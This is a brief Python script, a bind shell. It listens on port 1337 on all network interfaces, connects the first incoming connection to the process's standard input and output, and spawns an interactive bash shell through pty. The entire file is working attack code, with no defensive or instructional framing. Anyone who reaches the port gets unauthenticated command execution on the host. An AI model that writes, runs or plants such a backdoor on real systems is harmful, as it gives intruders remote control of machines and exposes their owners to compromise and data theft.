import sys,socket,os,pty

# Bind to all interfaces on port 1337
HOST = "0.0.0.0"
PORT = 1337 

# Create a socket object 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Allow the socket to be reused
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 

# Bind the socket to the specified host and port 
s.bind((HOST, PORT)) 
print(f"[*] Listening on {HOST}:{PORT}")

# Listen for incoming connections 
s.listen(1) 

# Accept a connection
conn, addr = s.accept() 
print(f"[+] Connection established from {addr}")

# Duplicate the socket's file descriptor to stdin, stdout and stderr 
os.dup2(conn.fileno(), 0) 
os.dup2(conn.fileno(), 1) 
os.dup2(conn.fileno(), 2) 

# Spawn a new bash shell
pty.spawn("/bin/bash")
